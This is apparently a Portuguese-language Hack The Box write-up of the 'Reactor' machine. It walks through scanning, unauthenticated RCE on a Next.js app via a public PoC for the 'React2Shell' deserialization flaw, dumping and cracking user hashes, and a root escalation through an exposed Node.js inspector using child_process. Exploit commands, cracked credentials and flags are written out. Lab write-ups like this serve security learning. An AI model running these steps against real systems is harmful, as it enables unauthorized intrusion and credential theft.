# Reactor — Hack The Box

**Dificuldade:** —
**OS:** Linux
**Data:** 2026-08-15
**IP:** `10.129.105.11`

## Resumo

A máquina expõe uma aplicação Next.js ("ReactorWatch") na porta 3000, vulnerável a **CVE-2025-55182 / CVE-2025-66478 ("React2Shell")**, um RCE não autenticado no protocolo Flight das React Server Components. A partir do acesso inicial (`node`), uma base de dados SQLite exposta revelou hashes de utilizadores; o hash do utilizador `engineer` foi crackado via rockyou. Escalação para root através do debugger do Node.js (`--inspect`) exposto em `127.0.0.1:9229`, associado a um processo de monitorização que corria com privilégios root.

## Reconhecimento

```bash
nmap -sC -sV 10.129.105.11
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open  http    Next.js (React 19.0.0)
```

## Enumeração

- Porta 3000: dashboard estático "ReactorWatch | Core Monitoring System" — sem interação visível.
- Análise dos bundles JS (`/_next/static/chunks/*.js`) confirmou **React 19.0.0** e uso de React Server Components / Server Actions (headers `Next-Action`, `RSC`, `Next-Router-State-Tree`).
- `gobuster` e testes manuais de rotas comuns (`/admin`, `/api`, `/login`, etc.) não revelaram endpoints adicionais — a app é maioritariamente estática do lado do cliente.
- Manifests do Next.js (`app-build-manifest.json`, `build-manifest.json`) devolveram 404 — sem rotas escondidas visíveis.
- A combinação de versão exata (React 19.0.0) + uso confirmado de RSC/Flight apontou para uma classe de vulnerabilidade conhecida.

## Acesso Inicial

**CVE-2025-55182 (React) / CVE-2025-66478 (Next.js) — "React2Shell"**: falha de deserialização insegura no protocolo Flight das React Server Components, permitindo RCE não autenticado através de um payload HTTP especialmente construído, mesmo em configurações padrão.

Confirmação via PoC público (`exploit.py`, variante com flags `-u`/`-c`/`--linux`):

```bash
python exploit.py -u http://10.129.105.11:3000 -c "whoami" --linux
```

```
OUTPUT:
node
```

Confirmado RCE como o utilizador `node` (uid=999, gid=988).

## Pós-Exploração / Movimento Lateral

Enumeração do diretório da aplicação (`/opt/reactor-app`) revelou um ficheiro `reactor.db` (SQLite):

```bash
python exploit.py -u http://10.129.105.11:3000 -c "sqlite3 reactor.db .dump" --linux
```

Extraiu-se a tabela `users`:

```sql
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

Crack dos hashes MD5 com hashcat:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Resultado: `engineer:reactor1`

Login SSH bem-sucedido:

```bash
ssh engineer@10.129.105.11
```

## Escalação de Privilégios

Enumeração de processos revelou um serviço a correr como root com o debugger do Node.js ativo e exposto em localhost:

```
root  1125  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

O inspector do Node permite execução de código arbitrário no contexto do processo (root):

```bash
node inspect 127.0.0.1:9229
```

Dentro da REPL do debugger:

```javascript
repl
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

Execução bem-sucedida como root, confirmando a escalação completa.

## Flags

- User: `c0d1e6c23e28b9ffe9f43be0379939ad`
- Root: `cf7fe87eb3e229f42ef20bc3feeb3002`

## Lições Aprendidas

- Versões exatas de frameworks (aqui, React 19.0.0) são um indicador direto de CVEs conhecidas — vale sempre a pena confirmar a versão via bundles JS/headers antes de gastar tempo em enumeração de rotas.
- Grupos de sistema como `lxd` são pistas óbvias de escalação, mas nem sempre estão disponíveis (LXD não instalado neste caso) — vale a pena sempre também revisar processos a correr como root (`ps aux`) à procura de portas de debug ou serviços mal configurados.
- O Node.js Inspector (`--inspect`), quando exposto mesmo só em localhost, é uma superfície de ataque crítica quando combinado com acesso local — permite RCE trivial no contexto do processo.

## Referências

- [NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Wiz Research — React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [TryHackMe — React2Shell room](https://tryhackme.com/room/react2shellcve202555182)
